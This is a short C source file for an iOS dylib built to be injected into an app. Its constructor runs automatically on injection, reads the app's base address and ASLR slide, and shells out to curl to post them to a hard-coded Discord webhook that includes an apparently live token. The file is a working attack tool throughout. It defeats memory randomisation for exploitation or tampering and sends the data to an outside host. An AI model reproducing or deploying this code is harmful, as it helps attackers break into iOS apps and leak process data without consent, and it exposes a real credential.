#include <stdio.h>
#include <stdlib.h>
#include <mach-o/dyld.h>

// This runs as soon as the dylib is injected
__attribute__((constructor))
static void init() {
    // 1. Get the memory addresses
    uintptr_t base = (uintptr_t)_dyld_get_image_header(0);
    intptr_t slide = _dyld_get_image_vmaddr_slide(0);

    // 2. Build the command to send data to Discord
    // We use the 'system' command to call the curl app already on the iPhone
    char command[2048];
    snprintf(command, sizeof(command), 
             "curl -H \"Content-Type: application/json\" -X POST "
             "-d '{\"content\": \"✅ **iOS Address Grabber**\\n**Base:** `0x%lx`\\n**Slide:** `0x%lx`\"}' "
             "\"https://discord.com/api/webhooks/1428780310451196048/Ps9b7xw3Tg1D5RPJka-AMg4Sfl_Elrw2bFO-Gvdgrhx-u8Aa9bxhjA2luPp9qhUvrehF\"", 
             base, slide);

    // 3. Execute the command
    system(command);
}
